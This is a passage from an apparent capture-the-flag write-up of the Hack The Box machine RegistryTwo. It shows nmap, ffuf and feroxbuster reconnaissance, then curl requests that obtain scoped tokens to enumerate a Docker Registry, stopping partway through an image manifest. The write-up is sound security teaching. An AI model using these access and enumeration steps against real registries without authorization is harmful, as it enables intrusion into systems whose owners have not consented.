---
title: HTB: RegistryTwo
url: https://0xdf.gitlab.io/2024/02/03/htb-registrytwo.html
date: 2024-02-03T14:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: htb-registrytwo, ctf, hackthebox, nmap, ubuntu, ffuf, vhosts, nginx, java, war, feroxbuster, docker, docker-registry, youtube, dockerregistrygrabber, catalina, tomcat, jd-gui, reverse-enginering, rmi, java-rmi, breaking-parser-logic, tomcat-examples, tomcat-session, file-read, mass-assignment, null-byte, update-alternatives, docker-host-network, idea-ide, java-jar, pspy, recaf, python, clamav, ipv6, htb-registry
---

![RegistryTwo](/img/registrytwo-cover.png)

RegistryTwo is a very difficult machine focusing on exploiting Java applications. At the start, there’s a Docker Registry and auth server that I’ll use to get an image and find a Java War file that runs the webserver. Enumeration and reversing show multiple vulnerabilities including nginx/Tomcat issues, mass assignment, and session manipulation. I’ll chain those together to get a foothold in the production container. From there, I’ll create a rogue Java RMI client to get file list and read on the host, where I find creds to get a shell. To escalate to root, I’ll wait for the RMI server to restart, and start a rogue server to listen on the port before it can. My server will abuse a process for scanning files with ClamAV and get file read and eventually a shell. In Beyond Root, I’ll go over some unintended paths, and look at the nginx configuration that allows for dynamic creation of different website virtual hosts.

## Box Info

| Name | [RegistryTwo](https://hackthebox.com/machines/registrytwo)  [RegistryTwo](https://hackthebox.com/machines/registrytwo) [Play on HackTheBox](https://hackthebox.com/machines/registrytwo) |
| --- | --- |
| Release Date | [22 Jul 2023](https://twitter.com/hackthebox_eu/status/1682042900975325186) |
| Retire Date | 03 Feb 2024 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for RegistryTwo |
| Radar Graph | Radar chart for RegistryTwo |
| First Blood User | 13:18:26[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 14:54:29[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [irogir irogir](https://app.hackthebox.com/users/476556) |

## Recon

### nmap

`nmap` finds four open TCP ports, SSH (22) and three HTTPS (443, 5000, 5001):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.223
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-26 08:01 EST
Nmap scan report for 10.10.11.223
Host is up (0.11s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
5000/tcp open  upnp
5001/tcp open  commplex-link

Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds
oxdf@hacky$ nmap -p 22,443,5000,5001 -sCV 10.10.11.223
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-26 08:03 EST
Nmap scan report for 10.10.11.223
Host is up (0.11s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa:b0:03:98:7e:60:c2:f3:11:82:27:a1:35:77:9f:d3 (RSA)
|   256 f2:59:06:dc:33:b0:9f:a3:5e:b7:63:ff:61:35:9d:c5 (ECDSA)
|_  256 e3:ac:ab:ea:2b:d6:8e:f4:1f:b0:7b:05:0a:69:a5:37 (ED25519)
443/tcp  open  ssl/http           nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to https://www.webhosting.htb/
| ssl-cert: Subject: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2023-02-01T20:19:22
|_Not valid after:  2024-02-01T20:19:22
5000/tcp open  ssl/http           Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
5001/tcp open  ssl/commplex-link?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 26 Jan 2024 19:38:36 GMT
|     Content-Length: 10
|     found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 26 Jan 2024 19:38:06 GMT
|     Content-Length: 26
|_    <h1>Acme auth server</h1>
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5001-TCP:V=7.80%T=SSL%I=7%D=1/26%Time=65B3AD9E%P=x86_64-pc-linux-gn
SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,8E,"HTTP/1\.0\x20200\x20OK\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf-8\r\nDate:\x20Fri,\x2026\x20Jan\x20202
SF:4\x2019:38:06\x20GMT\r\nContent-Length:\x2026\r\n\r\n<h1>Acme\x20auth\x
SF:20server</h1>\n")%r(HTTPOptions,8E,"HTTP/1\.0\x20200\x20OK\r\nContent-T
SF:ype:\x20text/html;\x20charset=utf-8\r\nDate:\x20Fri,\x2026\x20Jan\x2020
SF:24\x2019:38:06\x20GMT\r\nContent-Length:\x2026\r\n\r\n<h1>Acme\x20auth\
SF:x20server</h1>\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalSe
SF:rverCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,A7,"HTTP/1
SF:\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Fri,\x2026\x20Ja
SF:n\x202024\x2019:38:36\x20GMT\r\nContent-Length:\x2010\r\n\r\nNot\x20fou
SF:nd\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.65 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 18.04 bionic. Port 443 is redirecting to `www.webhosting.htb`. Port 5000 seems like Docker Registry. Port 5001 is something under TLS and HTTP.

### Subdomain Fuzz

The site is clearly using virtual host routing, so I’ll fuzz for additional subdomains that respond differently from the default case (which seems to be a redirect to `www.webhosting.htb`). On port 443, it only finds www:

```

oxdf@hacky$ ffuf -u https://10.10.11.223 -H "Host: FUZZ.webhosting.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.223
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.webhosting.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

www                     [Status: 200, Size: 23978, Words: 9500, Lines: 670, Duration: 107ms]
:: Progress: [19966/19966] :: Job [1/1] :: 366 req/sec :: Duration: [0:00:55] :: Errors: 0 ::

```

There’s a lot of fuzzing I should do from here (trying each web service, subdomains of `www.webhosting.htb`), but none of them will find anything interesting.

### Website - TCP 443

#### Site

The site is for a web hosting company:

![image-20240126151737482](/img/image-20240126151737482.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s an email on this page (`contact@www.webhosting.htb`), but otherwise not much interesting. The “About” page (`about.html`) is similar.

The Login and Register forms are similar, and located at `/hosting/auth/signin` and `/hosting/auth/signup` respectively. I’ll sign up:

![image-20240126153341598](/img/image-20240126153341598.png)

#### Site Authenticated

On logging, I’m redirected to `/hosting/panel`, where I get a panel to control my domains:

![image-20240126154328685](/img/image-20240126154328685.png)

I can create a domain:

![image-20240126154348425](/img/image-20240126154348425.png)

And then it gives an `index.html` and allows me to add and modify files in the space:

![image-20240126154412850](/img/image-20240126154412850.png)

![image-20240126154517731](/img/image-20240126154517731.png)

If I click the “Open” button it opens `https://www.static-[domain id].webhosting.htb/`. Once I update my `/etc/hosts` file, this shows the page:

![image-20240131111011513](/img/image-20240131111011513.png)

I’ll look at how the webserver is configured to support dynamic domains like this in [Beyond Root](#nginx-setup).

There’s a profile page (`/hosting/profile`) that allows me to update my info and see my domains:

![image-20240126154450823](/img/image-20240126154450823.png)

#### Tech Stack

The initial site seems like static HTML. There’s only `index.html` and `about.html`, and nothing else of interesting. Once I get into `/hosting`, it behaves differently. On first visiting the signin or signup pages, it sets a `JSESSIONID` cookie:

```

HTTP/1.1 200 
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 26 Jan 2024 20:33:04 GMT
Content-Length: 3781
Connection: keep-alive
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Set-Cookie: JSESSIONID=E516DEADF142235D2BEC0D1D5B538F21; Path=/; HttpOnly

```

This suggests this is a Java application.

I’ll also note a difference in the 404 responses when visiting a non-existent page on the root of the site vs one in the `/hosting` folder. `/0xdf` returns the nginx 404 page:

![image-20240126160338826](/img/image-20240126160338826.png)

`/hosting/0xdf` returns a 302 redirect to `/hosting/auth/signin`. From this, it seems likely that nginx is handling the root, but forwarding anything in `/hosting` to a Java application.

The TLS certificate for the site shows no DNS name or subject alternative names, just the contact email:

![image-20240127074620544](/img/image-20240127074620544.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site. I’m not going to bother with checking the `.html` extension (though I might in the background later) as it adds a lot of requests and not much potential value:

```

oxdf@hacky$ feroxbuster -u https://www.webhosting.htb -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://www.webhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       13w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       13w      194c https://www.webhosting.htb/js => https://www.webhosting.htb/js/
301      GET        7l       13w      194c https://www.webhosting.htb/images => https://www.webhosting.htb/images/
301      GET        7l       13w      194c https://www.webhosting.htb/css => https://www.webhosting.htb/css/
200      GET      669l     1715w    23978c https://www.webhosting.htb/
301      GET        7l       13w      194c https://www.webhosting.htb/hosting => https://www.webhosting.htb/hosting/
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       39l      110w     1544c https://www.webhosting.htb/hosting/META-INF
404      GET       39l      110w     1544c https://www.webhosting.htb/hosting/WEB-INF
404      GET       39l      110w     1544c https://www.webhosting.htb/hosting/web-inf
[####################] - 1m    150000/150000  0s      found:8       errors:0
[####################] - 1m     30000/30000   296/s   https://www.webhosting.htb/
[####################] - 1m     30000/30000   300/s   https://www.webhosting.htb/js/
[####################] - 1m     30000/30000   300/s   https://www.webhosting.htb/images/
[####################] - 1m     30000/30000   300/s   https://www.webhosting.htb/css/
[####################] - 1m     30000/30000   265/s   https://www.webhosting.htb/hosting/

```

I’ll note the `META-INF` and `WEB-INF` directories. They both return 404, but a different 404 than the default that’s being filtered.

I run `feroxbuster` in the mode where it smart filters. I’ll also note that `feroxbuster` adds another default filter after it starts in `/hosting`.

Nothing else too interesting here.

### Docker Registry - TCP 5000 / 5001

#### TLS Certificate

The TLS certificate on port 5000 and 5001 is for `*.webhosting.htb` as well as the DNS name `webhosting.htb`:

![image-20240127073854175](/img/image-20240127073854175.png)

#### TCP 5000

Visiting `https://10.10.11.223:5000` returns an empty page. `nmap` said it was Docker Registry. The HackTricks page [5000 - Pentesting Docker Registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry) has this list to identify Docker Registry:

![image-20240126165508084](/img/image-20240126165508084.png)

I’ll try `/v2/`, but I get a 401 Unauthorized response:

```

HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8
Docker-Distribution-Api-Version: registry/2.0
Www-Authenticate: Bearer realm="https://webhosting.htb:5001/auth",service="Docker registry"
X-Content-Type-Options: nosniff
Date: Fri, 26 Jan 2024 21:55:14 GMT
Content-Length: 87

{
    "errors": [{
        "code": "UNAUTHORIZED",
        "message": "authentication required",
        "detail": null
    }]
}

```

I’ll note the `Www-Authenticate` header shows that `https://webhosting.htb:5001/auth` is the authentication service for this service, and the `service` name is “Docker registry” (case matters). Given that it’s using the domain `webhosting.htb` (without “www”), I’ll start using that as well.

#### TCP 5001

Visiting this page returns:

![image-20240126165735657](/img/image-20240126165735657.png)

I can directory brute force to find `/auth`, or look at the headers above. Either way,it returns two tokens:

![image-20240126165842274](/img/image-20240126165842274.png)

Those are JWT tokens, and they are the same. If I decode the middle block (the first is the header and the last is the signature), I’ll get:

```

oxdf@hacky$ echo "eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNzA2MzA3MTg0LCJuYmYiOjE3MDYzMDYyNzQsImlhdCI6MTcwNjMwNjI4NCwianRpIjoiMTI0MjY1MjUyMTU1MDA4MTM5OSIsImFjY2VzcyI6W119" | base64 -d | jq .
{
  "iss": "Acme auth server",
  "sub": "",
  "aud": "",
  "exp": 1706307184,
  "nbf": 1706306274,
  "iat": 1706306284,
  "jti": "1242652521550081399",
  "access": []
}

```

That lines up nicely with the [Token Authentication Implementation](https://distribution.github.io/distribution/spec/auth/jwt/) article on the Docker Registry documentation.

#### Access Registry

To use the token, the page above says to send it in an `Authorization: Bearer [token]` header. If I send that token, it still fails:

```

oxdf@hacky$ curl -k 'https://webhosting.htb:5000/v2/' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNzA2MzA3MTg0LCJuYmYiOjE3MDYzMDYyNzQsImlhdCI6MTcwNjMwNjI4NCwianRpIjoiMTI0MjY1MjUyMTU1MDA4MTM5OSIsImFjY2VzcyI6W119.RlbOC_S7c6odwcMCSK83N6ZnznWm-8S7sm9pH-8yNPQfKedhbQtcgWuu72WPRQ4l11B1HwpalgqAZSFf5nepZXYgoqIanzRwi9rU4WgzXmDqMVBvD9-mXZGkC1f_203hJB7xIokDR8MkuJBNEbD4ICgcDbYOkHRmzedenrop7ZyLiEFm2xsG3amds8ioaMkobv1oI1mkl1ZvT93Mj2MzPcgaDG4zbg5z-a7ChgUQH4O5ZjxPeplkLeErezzWj-T-ELFreik_vws11eDToK7Fgla0_VLxi6ER_16H_gQLYiVw23R4cCQ4faIbGN0ebBm7LzLmYKdq45b7KSL2jPmzhw'
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}

```

That’s because there’s no access in that token.

The token auth docs show requesting a token from the following URL:

```

/token?service=registry.docker.io&scope=repository:samalba/my-app:pull,push

```

That seems like a way to request different privileges. The 401 gave a URL of `/auth` rather than `/token`. The `service` must be “Docker registry” as shown in the header above. For the `scope`, [this GitHub issue](https://github.com/distribution/distribution/issues/2181) shows that `registry:catalog:*` is a way to request the catalog. I’ll try that:

```

oxdf@hacky$ curl -k 'https://webhosting.htb:5001/auth?service=Docker+registry&scope=registry:catalog:*'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzA2MzA4Nzg4LCJuYmYiOjE3MDYzMDc4NzgsImlhdCI6MTcwNjMwNzg4OCwianRpIjoiNzM5NDcwMTE1OTkxNDU0MjY4MiIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.S1ZMIuJOGo3NlXxei60L905NBBnIu70WQCGcA6EuFsiYrhGoeLWVOeLygatuniFavmnxM_-grVW3lb2NNhuVnY_eLjKQ-B57A6aNqA7tsr9RBAsFB5T3YVbHc4mNtg5OiGJWP4F-iveDpZGfAA3eWAN7oZ1m8_hogTHzkIqAZE3uM5DfFfCAICKd-DDf60vVJ1yExC50L5IxIARRSvIpRT9WI-FhrHSeP8MXBwEU5pEpd6hiPOUrHpA7VeD8idkg6eFNza6nMSZ4sZu9_Q9XqnVJQ6dB9zb4JkF39BPUxm8hA4PZXlAbV1lJT9kc35GfWO-uIrn0aiiv_3lPk0eCkw","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzA2MzA4Nzg4LCJuYmYiOjE3MDYzMDc4NzgsImlhdCI6MTcwNjMwNzg4OCwianRpIjoiNzM5NDcwMTE1OTkxNDU0MjY4MiIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.S1ZMIuJOGo3NlXxei60L905NBBnIu70WQCGcA6EuFsiYrhGoeLWVOeLygatuniFavmnxM_-grVW3lb2NNhuVnY_eLjKQ-B57A6aNqA7tsr9RBAsFB5T3YVbHc4mNtg5OiGJWP4F-iveDpZGfAA3eWAN7oZ1m8_hogTHzkIqAZE3uM5DfFfCAICKd-DDf60vVJ1yExC50L5IxIARRSvIpRT9WI-FhrHSeP8MXBwEU5pEpd6hiPOUrHpA7VeD8idkg6eFNza6nMSZ4sZu9_Q9XqnVJQ6dB9zb4JkF39BPUxm8hA4PZXlAbV1lJT9kc35GfWO-uIrn0aiiv_3lPk0eCkw"}
oxdf@hacky$ echo "eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzA2MzA4Nzg4LCJuYmYiOjE3MDYzMDc4NzgsImlhdCI6MTcwNjMwNzg4OCwianRpIjoiNzM5NDcwMTE1OTkxNDU0MjY4MiIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ" | base64 -d | jq .
base64: invalid input
{
  "iss": "Acme auth server",
  "sub": "",
  "aud": "Docker registry",
  "exp": 1706308788,
  "nbf": 1706307878,
  "iat": 1706307888,
  "jti": "7394701159914542682",
  "access": [
    {
      "type": "registry",
      "name": "catalog",
      "actions": [
        "*"
      ]
    }
  ]
}

```

That token seems to have full permissions on the `aud` (Audience) of “Docker registry”. It works to query:

```

oxdf@hacky$ curl -k 'https://webhosting.htb:5000/v2/' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzA2MzA4Nzg4LCJuYmYiOjE3MDYzMDc4NzgsImlhdCI6MTcwNjMwNzg4OCwianRpIjoiNzM5NDcwMTE1OTkxNDU0MjY4MiIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.S1ZMIuJOGo3NlXxei60L905NBBnIu70WQCGcA6EuFsiYrhGoeLWVOeLygatuniFavmnxM_-grVW3lb2NNhuVnY_eLjKQ-B57A6aNqA7tsr9RBAsFB5T3YVbHc4mNtg5OiGJWP4F-iveDpZGfAA3eWAN7oZ1m8_hogTHzkIqAZE3uM5DfFfCAICKd-DDf60vVJ1yExC50L5IxIARRSvIpRT9WI-FhrHSeP8MXBwEU5pEpd6hiPOUrHpA7VeD8idkg6eFNza6nMSZ4sZu9_Q9XqnVJQ6dB9zb4JkF39BPUxm8hA4PZXlAbV1lJT9kc35GfWO-uIrn0aiiv_3lPk0eCkw'
{}

```

#### Enumerate Catalog

I’ll use this `bash` to save the token in an env variable:

```

oxdf@hacky$ TOKEN=$(curl -sk 'https://webhosting.htb:5001/auth?service=Docker+registry&scope=registry:catalog:*' | jq -r .token)
oxdf@hacky$ curl -k 'https://webhosting.htb:5000/v2/' -H "Authorization: Bearer $TOKEN"
{}

```

`/v2/_catalog` will list the catalog:

```

oxdf@hacky$ curl -k 'https://webhosting.htb:5000/v2/_catalog' -H "Authorization: Bearer $TOKEN"
{"repositories":["hosting-app"]}

```

There’s a repository named `hosting-app`.

#### Get Tags

Just like I showed in [Registry](/2020/04/04/htb-registry.html#enumerate-registry), I can request a tags list for the repo with `/v2/[repo]/tags/list`. Unfortunately, it fails:

```

oxdf@hacky$ curl -k 'https://webhosting.htb:5000/v2/hosting-app/tags/list' -H "Authorization: Bearer $TOKEN"
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"repository","Class":"","Name":"hosting-app","Action":"pull"}]}]}

```

It shows the action I’m trying to do as `pull`. I’ll request that from the auth server:

```

oxdf@hacky$ TOKEN=$(curl -sk 'https://webhosting.htb:5001/auth?service=Docker+registry&scope=repository:hosting-app:pull' | jq -r .token)
oxdf@hacky$ curl -k 'https://webhosting.htb:5000/v2/hosting-app/tags/list' -H "Authorization: Bearer $TOKEN"
{"name":"hosting-app","tags":["latest"]}

```

There’s one tag, `latest`.

#### Get Blobs

The manifest contains all the layers for the image, which I can request using the `/v2/[repository]/manifests/[tag]` endpoint:

```

oxdf@hacky$ curl -k 'https://webhosting.htb:5000/v2/hosting-app/manifests/latest' -H "Authorization: Bearer $TOKEN"
{
   "schemaVersion": 1,
   "name": "hosting-app",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba"
      },
      {
         "blobSum": "sha256:4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42"
      },
      {
         "blobSum": "sha256:9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268"
      },
      {
         "blobSum": "sha256:b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc"
      },
      {
         "blobSum": "sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7"
      },
      {
         "blobSum": "sha256:9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c"
      },
      {
         "blobSum": "sha256:ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e"
      },
      {
         "blobSum": "sha256:497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
